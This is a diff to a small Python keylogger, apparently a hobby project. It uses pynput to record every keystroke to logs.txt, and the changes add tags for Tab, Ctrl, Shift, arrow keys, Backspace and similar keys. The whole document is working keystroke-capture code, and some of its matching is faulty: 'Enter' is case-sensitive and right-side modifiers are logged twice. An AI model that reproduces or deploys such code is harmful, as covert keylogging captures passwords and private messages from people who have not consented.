@@ -8,8 +8,9 @@ from pynput.keyboard import Key, Listener
 
 
 def on_press(key):
-    print(f'{key} pressed')
+    print(f'{key}')
     write_file(key)
+
 
 # write_file(key
 # @parameters: key
@@ -20,11 +21,41 @@ def on_press(key):
 def write_file(key):
     with open("logs.txt", "a") as f:
         ke = str(key).replace("'", "")
-        print(key)
         if ke.find("space") > 0:
             f.write('\n')
+        if ke.find("tab") > 0:
+            f.write("<tab>")
+        if ke.find("ctrl") > 0:
+            f.write("<ctrl>")
+        if ke.find("caps_lock") > 0:
+            f.write("<Caps_Lock>")
+        if ke.find("shift") > 0:
+            f.write("<Shift>")
+        if ke.find("cmd") > 0:
+            f.write("<Command>")
+        if ke.find("alt") > 0:
+            f.write("<Alt>")
+        if ke.find("ctrl_r") > 0:
+            f.write("<Ctrl_r>")
+        if ke.find("shift_r") > 0:
+            f.write("<Shift_r>")
+        if ke.find("up") > 0:
+            f.write("<Up>")
+        if ke.find("down") > 0:
+            f.write("<Down>")
+        if ke.find("left") > 0:
+            f.write("<Left>")
+        if ke.find("right") > 0:
+            f.write("<Right>")
+        if ke.find("Enter") > 0:
+            f.write("<Enter>")
+        if ke.find("backspace") > 0:
+            f.write("<Backspace>")
+        if ke.find("delete") > 0:
+            f.write("<Delete>")
         if ke.find("Key") == -1:
             f.write(ke)
+
 
 # on_release(key)
 # @parameters: key
